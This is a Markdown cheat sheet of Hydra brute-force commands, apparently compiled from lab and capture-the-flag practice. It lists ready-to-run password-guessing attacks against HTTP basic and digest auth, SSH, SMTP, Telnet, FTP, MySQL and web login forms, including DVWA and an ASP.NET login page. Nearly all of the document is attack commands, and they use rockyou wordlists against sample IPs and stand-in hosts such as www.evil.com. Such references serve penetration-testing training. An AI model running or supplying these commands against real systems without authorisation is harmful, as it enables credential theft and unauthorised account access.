# Hydra 
### BASIC AUTH - HTTP
```
hydra -L users.txt -P words.txt www.evil.com http-head /damn/
```

### DIGEST AUTHENTICATION
```
hydra -l root -P test.txt -vV localhost http-get /forbiddenPage
```

### SSH
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.204.239 ssh
```

### SMTP
```
hydra smtp.victimsemailserver.com smtp -l useraccount@gmail.com -P '/root/Desktop/rockyou.txt' -s portnumber -S -v 
```

### TELNET
```
hydra -l <username> -P <password_file> telnet://targetname
```

### FTP
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.204.239 ftp
```

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ftp://10.10.204.239
```

### MySQL
```
hydra -L <your_username_file> -P <your_password_file> <IP> mysql -s 3306 -o output.txt
```

```
hydra -L <your_username_file> -P <your_password_file> <IP> mysql -o output.txt
 # by default mysql uses port 3306 so we do not need to specify it,
 # anyway it is fundamental to specify it if the mysql port is different
```

### HTTP Forms (GET|POST)
```
hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
"index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=messageshowed"
```

### HTTP Get Form
```
hydra -l admin -P /root/Desktop/wordlists/test.txt http://www.website.com \
http-get-form "/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
```

```
hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
```

### HTTP Post Form
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.91.237 http-form-post "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=7IG0g5cTbrZBjicZV6TtVHBbJangfdUbSNLIODVRR1BjEP6XH20QWvrU7OtSMSQ%2F0Vx4b3%2BM1Dxjak%2FkYsmkxbYtXZFPOwi3%2BhMU7coXXuPdSGilJNXyxR52f21sjPHzM14e26Ayx8rj4ThSiOfGb1ih7GPGQmK6fEMq1TBb3SkffUYD&__EVENTVALIDATION=8mrFoEUV2XIzv5SI2pr4la7G9tKlGr2%2FRA8LZrZ2mQ6B%2F4eG9%2FiewNrJzKrMT6P9P4%2BPPIVBsJvahZelM97dwhw4256rwAt51QpKJWrlHOrUdG1QF0PMmXBoasn6rmUByfb228oA3%2BMDkNkyFGh0XFtVY4zGknQoj%2BhHAgQFYO5u5hZ%2F&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv -t 64
```